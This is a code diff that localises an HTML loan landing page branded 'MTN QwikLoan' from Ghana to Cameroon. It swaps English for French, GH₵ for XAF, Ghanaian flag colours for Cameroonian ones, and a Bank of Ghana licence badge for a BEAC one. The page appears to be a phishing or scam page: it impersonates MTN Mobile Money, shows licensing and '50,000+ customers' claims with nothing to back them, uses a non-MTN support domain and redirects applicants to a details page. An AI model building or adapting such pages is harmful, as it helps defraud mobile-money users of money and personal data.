@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN QwikLoan – Instant Cash to MoMo</title>
+    <title>MTN QwikLoan – Crédit instantané sur MoMo</title>
 
     <!-- Fonts & Icons -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -25,6 +25,10 @@
             --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
             --shadow-hover: 0 12px 32px rgba(0, 0, 0, 0.12);
             --border-radius: 20px;
+            /* Cameroon flag colors */
+            --cm-green: #007A5E;
+            --cm-red: #CE1126;
+            --cm-yellow: #FCD116;
         }
 
         body {
@@ -92,7 +96,7 @@
         .flag-small {
             width: 24px;
             border-radius: 3px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
         /* ===== LOADING OVERLAY ===== */
@@ -117,7 +121,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         /* ===== MAIN CARD (static loan range) ===== */
@@ -128,7 +134,7 @@
             margin-bottom: 20px;
             box-shadow: var(--shadow);
             transition: transform 0.2s ease, box-shadow 0.2s ease;
-            border: 1px solid rgba(0,0,0,0.05);
+            border: 1px solid rgba(0, 0, 0, 0.05);
             position: relative;
         }
 
@@ -137,7 +143,7 @@
             box-shadow: var(--shadow-hover);
         }
 
-        /* Ghana flag stripe */
+        /* Cameroon flag stripe (green · red · yellow + MTN gold) */
         .main-card::before {
             content: '';
             position: absolute;
@@ -145,13 +151,16 @@
             left: 0;
             right: 0;
             height: 5px;
-            background: linear-gradient(90deg, 
-                #CE1126 0%,    /* Ghana red */
-                #FCD116 25%,   /* Ghana gold */
-                #006B3F 50%,   /* Ghana green */
-                #000000 75%,
-                var(--mtn-yellow) 100%
-            );
+            background: linear-gradient(90deg,
+                    var(--cm-green) 0%,
+                    var(--cm-green) 25%,
+                    var(--cm-red) 25%,
+                    var(--cm-red) 50%,
+                    var(--cm-yellow) 50%,
+                    var(--cm-yellow) 75%,
+                    var(--mtn-yellow) 75%,
+                    var(--mtn-yellow) 100%
+                );
             border-radius: var(--border-radius) var(--border-radius) 0 0;
         }
 
@@ -242,7 +251,7 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            margin: 0 0 20px 0;  /* consistent spacing below button */
+            margin: 0 0 20px 0;
         }
 
         .btn-apply:active {
@@ -264,7 +273,7 @@
             padding: 24px;
             margin-bottom: 20px;
             box-shadow: var(--shadow);
-            border: 1px solid rgba(0,0,0,0.05);
+            border: 1px solid rgba(0, 0, 0, 0.05);
         }
 
         .trust-title {
@@ -342,90 +351,94 @@
         }
 
         @media (max-width: 420px) {
-            .logo-text { font-size: 1.6rem; }
-            .loan-amount-display { font-size: 1.8rem; }
+            .logo-text {
+                font-size: 1.6rem;
+            }
+            .loan-amount-display {
+                font-size: 1.8rem;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Header with Ghana flag -->
-    <div class="header">
-        <div class="logo">
-            <div class="logo-text">
-                <span class="mtn">MTN</span><span class="qwikloan"> QwikLoan</span>
+    <div class="container">
+        <!-- Header with Cameroon flag -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-text">
+                    <span class="mtn">MTN</span><span class="qwikloan"> QwikLoan</span>
+                </div>
+            </div>
+            <div class="tagline">
+                <img class="flag-small" src="https://flagcdn.com/w40/cm.png" alt="Cameroon flag">
+                Crédit instantané vers votre porte-monnaie MTN MoMo
             </div>
         </div>
-        <div class="tagline">
-            <img class="flag-small" src="https://flagcdn.com/w40/gh.png" alt="Ghana flag">
-            Instant loans sent to your MTN MoMo wallet
+
+        <!-- Loading overlay -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="simple-spinner"></div>
+        </div>
+
+        <!-- Main card – static loan range -->
+        <div class="main-card">
+            <div class="loan-label">Votre plafond de crédit instantané</div>
+            <div class="loan-amount-display">XAF 1 000 – 300 000</div>
+            <p class="loan-subtext">Fonds envoyés directement sur MTN MoMo • Frais de service 8,9 % (proratisés) • Approbation en 5 minutes</p>
+
+            <div class="features">
+                <div class="feature"><i class="fas fa-bolt"></i> Décaissement instantané</div>
+                <div class="feature"><i class="fas fa-mobile-alt"></i> Sans paperasse</div>
+                <div class="feature"><i class="fas fa-shield-alt"></i> Sécurisé par MTN MoMo</div>
+                <div class="feature"><i class="fas fa-calendar-check"></i> Remboursement flexible</div>
+            </div>
+        </div>
+
+        <!-- CTA Button -->
+        <button class="btn-apply" id="applyBtn">
+            Continuer avec MTN MoMo <i class="fas fa-arrow-right"></i>
+        </button>
+
+        <!-- Trust badges (Cameroon specific) -->
+        <div class="trust-section">
+            <div class="trust-title">Approuvé par les Camerounais</div>
+            <div class="trust-badges">
+                <div class="trust-badge"><i class="fas fa-lock"></i> Sécurisé SSL</div>
+                <div class="trust-badge"><i class="fas fa-certificate"></i> Agréé par la BEAC</div>
+                <div class="trust-badge"><i class="fas fa-shield-alt"></i> Protection des données</div>
+                <div class="trust-badge"><i class="fas fa-users"></i> 50 000+ clients</div>
+            </div>
+            <div class="trust-note">⭐ Plus de 50 000 crédits accordés à travers le Cameroun ⭐</div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2026 MTN QwikLoan – Propulsé par MTN Mobile Money</p>
+            <p>Besoin d'aide ? <a href="mailto:support@mtnqwikloan.cm">support@mtnqwikloan.cm</a></p>
         </div>
     </div>
 
-    <!-- Loading overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="simple-spinner"></div>
-    </div>
+    <script>
+        (function() {
+            const applyBtn = document.getElementById('applyBtn');
+            const overlay = document.getElementById('loadingOverlay');
 
-    <!-- Main card – static loan range (no calculator) -->
-    <div class="main-card">
-        <div class="loan-label">Your instant loan range</div>
-        <div class="loan-amount-display">GH₵ 500 – 50,000</div>
-        <p class="loan-subtext">Funds sent directly to MTN MoMo • 8.9% service fee (prorated) • 5‑minute approval</p>
+            function startApplication() {
+                overlay.style.display = 'flex';
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    window.location.href = 'details.html';
+                }, 2000);
+            }
 
-        <div class="features">
-            <div class="feature"><i class="fas fa-bolt"></i> Instant disbursement</div>
-            <div class="feature"><i class="fas fa-mobile-alt"></i> No paperwork</div>
-            <div class="feature"><i class="fas fa-shield-alt"></i> MTN MoMo secure</div>
-            <div class="feature"><i class="fas fa-calendar-check"></i> Flexible repayment</div>
-        </div>
-    </div>
+            applyBtn.addEventListener('click', startApplication);
 
-    <!-- CTA Button (outside the card, exactly like EcoCash) -->
-    <button class="btn-apply" id="applyBtn">
-        Continue with MTN MoMo <i class="fas fa-arrow-right"></i>
-    </button>
-
-    <!-- Trust badges (Ghana specific) -->
-    <div class="trust-section">
-        <div class="trust-title">Trusted by Ghanaians</div>
-        <div class="trust-badges">
-            <div class="trust-badge"><i class="fas fa-lock"></i> SSL Secured</div>
-            <div class="trust-badge"><i class="fas fa-certificate"></i> Licensed by BoG</div>
-            <div class="trust-badge"><i class="fas fa-shield-alt"></i> Data Protection</div>
-            <div class="trust-badge"><i class="fas fa-users"></i> 50k+ customers</div>
-        </div>
-        <div class="trust-note">⭐ Over 50,000 loans disbursed across Ghana ⭐</div>
-    </div>
-
-    <!-- Footer -->
-    <div class="footer">
-        <p>© 2026 MTN QwikLoan – Powered by MTN Mobile Money</p>
-        <p>Need help? <a href="mailto:support@mtnqwikloan.com.gh">support@mtnqwikloan.com.gh</a></p>
-    </div>
-</div>
-
-<script>
-    (function() {
-        const applyBtn = document.getElementById('applyBtn');
-        const overlay = document.getElementById('loadingOverlay');
-
-        function startApplication() {
-            overlay.style.display = 'flex';
-            setTimeout(() => {
-                overlay.style.display = 'none';
-                window.location.href = 'details.html';
-            }, 2000);
-        }
-
-        applyBtn.addEventListener('click', startApplication);
-
-        // Ensure overlay hidden on page load / back navigation
-        window.addEventListener('load', () => { overlay.style.display = 'none'; });
-        window.addEventListener('pageshow', () => { overlay.style.display = 'none'; });
-    })();
-</script>
+            // Ensure overlay hidden on page load / back navigation
+            window.addEventListener('load', () => { overlay.style.display = 'none'; });
+            window.addEventListener('pageshow', () => { overlay.style.display = 'none'; });
+        })();
+    </script>
 
 </body>
 </html>
